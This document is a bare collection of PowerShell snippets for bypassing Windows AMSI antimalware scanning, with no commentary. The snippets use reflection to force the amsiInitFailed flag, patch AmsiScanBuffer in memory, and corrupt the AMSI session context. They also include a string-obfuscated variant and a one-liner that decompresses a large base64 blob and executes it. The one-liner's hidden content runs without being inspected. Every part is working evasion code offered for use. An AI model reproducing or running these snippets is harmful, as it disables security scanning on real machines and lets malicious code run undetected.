$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)

$A='System.Management.Automation.AmsiUtils';$B='amsiInitFailed';[Ref].Assembly.GetType($A).GetField($B,'NonPublic,Static').SetValue($null,$true)


$amsi = 'AmsiUtils';$type=[Ref].Assembly.GetType("System.Management.Automation." + $amsi)
$type.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true)

===============================
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$Addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$Patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)  # mov eax,0x80070057; ret
[Win32]::VirtualProtect($Addr, [uint32]$Patch.Length, 0x40, [ref]0) | Out-Null
for ($i = 0; $i -lt $Patch.Length; $i++) {
  [System.Runtime.InteropServices.Marshal]::WriteByte($Addr, $i, $Patch[$i])
}

=============================

#Obfuscated AMSI Bypass

$e='u'+''+'si'+'ng Sy'+'ste'+'m;'+'
u'+'sin'+'g Sys'+'tem.'+'Run'+'time.I'+'nteropS'+'ervices;'+'
pub'+'lic cla'+'ss X{'+'[DllImport("kernel32")]public static extern IntPtr G(IntPtr h,string p);'+
'[DllImport("kernel32")]public static extern IntPtr L(string n);'+
'[DllImport("kernel32")]public static extern bool V(IntPtr a, UIntPtr l, uint n, out uint o);}';
Add-Type $e;
$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);
$a=[X]::G([X]::L("amsi.dll"),"AmsiScanBuffer");
[X]::V($a, [uint32]$p.Length, 0x40, [ref]0) | Out-Null;
for($i=0;$i -lt $p.Length;$i++){[System.Runtime.InteropServices.Marshal]::WriteByte($a, $i, $p[$i])}


#One-liner AMSI Bypass
& ( $vERbOsepREfErENcE.TOSTrIng()[1,3]+'x'-Join'') ( nEw-object  iO.STrEAmReAdEr( ( nEw-object  Io.comPRESsION.DeflAtEstReaM([io.MemoRyStReaM] [SyStem.cONVerT]::FrOmbaSE64STriNG( 'vVp7b9s4Ev+/QL8DTzVgaWMbzqPp41BkHcfZDdAk3jhN7xAYBS3RCVM9fBKVxxb57jtDirIoyY7d5GoEikSRM8OZ37xov341TUNX8CgkR+Ft9J21Rw+JYEEvSPj+w4wmCfnx+hWBz2U/8Hwm9nno8fDKdsZqeEZjGhBbPch5QxxhgsV2fjdi4gTuyCfSPArheUpd1myRYxp6VETxA7xoTKmfsBYZRgmX4nwiXc1Dkk3uuHCvx6RxweJJlLDTVMxS0Xr96heyPuAJnfhscP5VvXU0dz4ltimYo/WGH/1qGLMpi1noojxWPwoFD1NmqYmPmpgAqQqL37whh2m4t8cSwnEHIU2k1kk0EQzGI+IxwkIPCO9FCWHEjTnNhj3msysqYOmbN3OKucn/YCKz9zCO3J7nxWxucP2RqrTNMaUWEQMSQC3HkZf6DNXcWjbtMGOLE815jvmYEfwTbOSjphonAiQtDnYUWO1GmPp+i/xuF2RwytREMBuKGOicsLv26eSGuQLALmCsNFHRPmNTc67SUOcsBXMFyBqMEM1GLL7lLks6+So749QyN1AWR24m03VlH5erMhvPpW2Zqi3u/7HoHjVmP8jwUWtzUmf0gosV3KXkUOdxyooelK9Wai9gIdNDHW5qOW2uyun8YcYux8CpF1+lAQsFDqzOZ2shUSB5xkQah/gAMy8vIu6Nl+NZu6Fe0pvNDqKA8nD88aNt9dMYYoJFNogl1LDldA7YlIfs4CGkAXd7ScKCif9g2zWwZFOfSV129DREgd2E938dNB2nRS6rUwcBF/n8/ZT7ED56LiAsAZEAfE6nun1DJIVwxeUYAqoKoouX4dbV7HOY3ez7kFog5KYTn7stMmLUZ16L9MKEZ696qYjkbXO+gePUF9ylidC4HS/TdKZDCLMQglIXIGM3z85HM+Zy6stoRf7kHtt/GPErLUqzVlt96vsQw4DSLSAJRlBLI4FAjEFqE2N1OoAsdBTMfIaTKBI49OlVAuIoN5egplfMa66wn2MmriPPbqrQgcrUWizsBnAy8iPRIhc8Fin10UJz2P6/Rc5wbkrfj1l2a5eWPBX0jmmcXFNfOgvELm186TGHUaxjyTCS+dFy7Ep4yaVaFBshyUJyxrSKmVOm11Rwn/+tM2mwJyIP0msIuriNzHxaStj4AcZtqYV20Sm1z36FIiq6SzogfJCQ9iCOI/A+GXpGIpoZMupbl0INUmZzfh1Hd8S6/NeYHFL/mhIaEepxFyjRmMB9xpx4EcmYEsnUWqCHRqB0jVFqRasUFn8JEzrNAJogCWOj8jrOo04HTJlHhYpWOorWCapbU2w6hslAV1hZJMSKJtM0calHE4uwgEwesOLpjfpHRwXh5CjwxFIHB0C8fRiCJGF373fetbr3u2/h8m4HLm+7eLeFY4d42YbLzibe7eiLeitXbMuLU8NLRcnlvHYOcjaSLr7Y7espO+/xTrIe5PzV2yJDWVTgziTMSMF85+xedAahG2HZDi4k1YK6V9qzDb1USM7Lqp8hqVYbVqvWchgoDOAgpSzIlYUoyCdL7iqxNvsfkdWUs8RX0OHQVbCCRjfR1TM6epmlVeuNRhX39A60ZWrl11ReSHTNa5GLz/0m60bQWfbIhEMSiQRzKekdjyqOgw3hUchFCcoSmAfaCXY/IGI/5GD9oDEu7xSK+/mLXgXFOaeDz59LTqMWewanLZZ7hCsvRVo0I7MubDP2ZVK4dygb+N/rO4JWnekHmihaH0jWt2L5LkoylGBk0Ho+jExei3F0mjegUd5pqtxJsdnIMicPuSspYSotKAAagZFSp046UFPBwOnUVoW27hbKTqMX4kbfVzaZS5/3Np/qGh5TZ9B4ZW0q1H9fgO/uzhgS3Hcop6AMVDWLQ2yUqFxyXqrZkh529AAJ7IhqowaDEvnl5c3UtKK8SwUtWrdcD1EfoKLLoRmLA54keCiBxREL9mJOC8adxRhKxCidTvk9Hr5gHdqEgq0JxehQvmxWp6uYqc9rfnQff2w+Nkl7WqIHJa8orv7O4pD5ytkteICFHc/3LVxpwZvtLavKa7nfzUlWZSvBsUjv+b5X4bYg/wRSYJz6BG6K4v1ua7BkMN/eqr2rg9J+FPljM4QNe38Mvg3+M+h/OR98+3p2dD7onw7/i6C678rP+25R71jA7svSDCLoJI/sE6xwsN7qmpe+UVFFMb/CDZuQxd3dQtcTH4EO79W7BbFRa0QfuVgjl4YhtAuw7RjPUwp+4ZB2yEi3YsScoPYftHd1WsneJyy8TgOCojIvisHeLiyPqRd1LHPho/lYFy4WYMm9phBEl4TuEvmSr3+OXJo3O5T4PBFUunkmM5bTRlGwSiDGvNfD3oH6dzQ2A/0Zo54MnDkii3ptkc3dctgaZpZWR3lLKZUYt8jujrN6PF5B7O0tEwYbsP31xEUKZUYbZHt3YX8KJopmWSCeQbcv2zvpUtjxYO8zB5hpqrtrDnWxbUi0BN7LjWrs7UJM/KdsUeDq1JBCJ8RmPYvGK5FCti2yteP8lPM8KT2a5plSF0lINhtkc6sqblX77RAiXE1sz8+Ji5whcKVcxuvd1qJgrIObDp/OU8FKBxSV7WMiYSWYPgVRiR4hZ4hSDTTmQM0JiVRkrrh+NHuwCymihWfKueXNXZdDQ8nwtQclC3bJEjdmt2zuS+E8HX9cb4tTcDy7wTEH/ZvA/7Yvijmv85mFV+IaX21s1LsVpsQLWsUkrs+9AJoMzyvjoMHLX3rgR7qzJooeXxDnssHHtVKUFDU/VaoGnWXqqbHLSwNeQ3ptiOd7grQmaPpyKDerkY2N50XXn0t0EGrsUlX0W95rlVGybshcM5n9rCyPlSJu/sVrtcxg4g4NtOYZVfEQIz+Ke4cnc+pxVx/AyZMMdSj4Lj/2mx9svK183QjyLO0tbCsURoeCN46xjxrgaKqLOwz8rNplFHg9BeqVvDSTroXfz/36TLTGbhYkohV9U9o3R//XmAsmg/N8/6W2pSBHeWiRs0keQG8ow2y1U5pOEYpva5iY0qmMqgmZ+TQXdwVZXyK7zlPGUlMVH58Lwl+THdb0o1XC/zpVwBx2K+X/7r27/eykv3jLNVZcMcGo2ukmq51uZO20jXcLSqWfV1Tjpk5TtdrKfeeycbO4Vno51dXoq16j5oCMQm31oyOQ4bcxGaX4PX6n/uCozgRVEkch/sQA8mQNlexfJRAoLTS+5bPgb9FvytrFX1K9fvUP') , [IO.COMpRessiON.COMPressIonMODE]::DEcOmpRess) ),[Text.EnCODINg]::ASCiI)).REaDToeND()

#Attack AmsiInitialize
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)

#Attack AmsiOpenSession
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)



